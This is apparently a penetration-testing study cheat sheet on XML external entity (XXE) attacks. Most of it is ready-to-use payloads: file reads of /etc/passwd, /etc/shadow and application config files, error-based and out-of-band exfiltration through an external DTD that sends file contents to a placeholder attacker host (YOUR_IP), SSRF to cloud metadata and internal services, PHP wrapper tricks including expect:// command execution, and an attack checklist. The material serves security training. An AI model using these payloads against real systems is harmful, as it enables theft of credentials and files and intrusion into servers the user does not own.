---
category: OSWA Web App Pentesting
order: 4
summary: Classic, blind (OOB), and error-based XXE payloads, file read primitives, and XXEinjector/XXExploiter quick reference.
---
# XXE

## Building blocks
Minimal well-formed XML:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<root><child>value</child></root>
```

Internal entity (confirms the parser resolves entities at all):
```xml
<!ENTITY name "value">
```

External entity (core XXE primitive):
```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "http://internal-host/admin">
```

Parameter entity (only usable inside the DTD, needed to chain entities for OOB):
```xml
<!ENTITY % name SYSTEM "URI">
```
Reference with `%name;` — only valid inside the DTD block.

Attribute vs. element gotcha — external entities don't work inside attribute values:
```xml
<!-- won't work -->
<Product description="&xxe;" />
<!-- works -->
<Product><description>&xxe;</description></Product>
```

## Basic test payload — local file read (Linux)
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```
Other common targets: `file:///etc/shadow`, `file:///proc/self/environ`, `file:///var/www/html/config.php`, `file:///C:/Windows/win.ini`.

## Error-based XXE (no direct output, but verbose errors exist)
Force a length/size error by targeting a field backed by a small DB column — the truncation error echoes your exfiltrated file contents.

"Nonexistent file" trick (no natural length limit), using parameter entities to append file contents to a bogus filename:
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % error "<!ENTITY &#x25; exfil SYSTEM 'file:///nonexistent/%file;'>">
%error;
%exfil;
]>
```

## Out-of-band (OOB) / blind XXE
Host a malicious external DTD on your attacker box (`external.dtd`):
```xml
<!ENTITY % content SYSTEM "file:///etc/passwd">
<!ENTITY % external "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR_IP/out?%content;'>">
%external;
%exfil;
```
Serve it: `python3 -m http.server 80`.

Payload that pulls and triggers the external DTD:
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE oob [
<!ENTITY % base SYSTEM "http://YOUR_IP/external.dtd">
%base;
]>
<data>test</data>
```
You'll see two hits in your server log: one for `external.dtd` (confirms XXE exists even if exfil fails) and one for `/out?<file-contents>`.

## XXE → SSRF
```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
<!ENTITY xxe SYSTEM "http://internal-admin-panel.local:8080/">
<!ENTITY xxe SYSTEM "http://127.0.0.1:6379/">
```

## Protocol wrappers
| Wrapper | Example | Notes |
|---|---|---|
| `file://` | `file:///etc/passwd` | Local file read — baseline technique |
| `http://` / `https://` | `http://internal/admin` | SSRF, or fetch external DTD for OOB |
| `php://filter` (PHP only) | `php://filter/convert.base64-encode/resource=config.php` | Base64-encodes a file before returning it — use when raw content would break the XML response |
| `php://expect` (PHP, rare) | `expect://id` | Direct command execution if the `expect` extension is loaded — full RCE |

PHP base64 file-read example (very common on OSWA-style PHP targets):
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
]>
<data>&xxe;</data>
```
Decode with `echo '<base64 string>' | base64 -d`.

## XInclude (when you can't control the DOCTYPE)
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```
Only works if your injection point lands inside an element value and the parser has XInclude support enabled.

## File-format-specific injection points
- **SVG** — image upload features that render/process SVGs.
- **DOCX / XLSX / PPTX** — zip archives containing XML internally; if the app unzips and parses that XML, injecting a DOCTYPE can trigger XXE.
- **SOAP / SAML** — both XML-based by definition.
- **RSS/Atom feeds** — if the app fetches and parses a feed you control.

## Methodology checklist (fast path)
1. Find the XML input point; get a valid baseline document from the app.
2. Add a DOCTYPE with an internal entity — confirms entity resolution.
3. Switch to an external entity with `file:///etc/passwd` — check for direct output.
4. Attribute injection point? Restructure to an element and retry.
5. No output: look for verbose errors (small/typed column, or nonexistent-file trick).
6. No usable output or errors: go OOB.
7. Consider SSRF and protocol-wrapper angles even after a successful file read.
8. DOCTYPE blocked outright? Test XInclude as a fallback.

## Reference links
- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [PortSwigger — XXE](https://portswigger.net/web-security/xxe)
- [PayloadsAllTheThings — XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
- [vulnsy.com — XXE Cheat Sheet (PHP `expect` wrapper)](https://www.vulnsy.com/cheat-sheets/xxe)
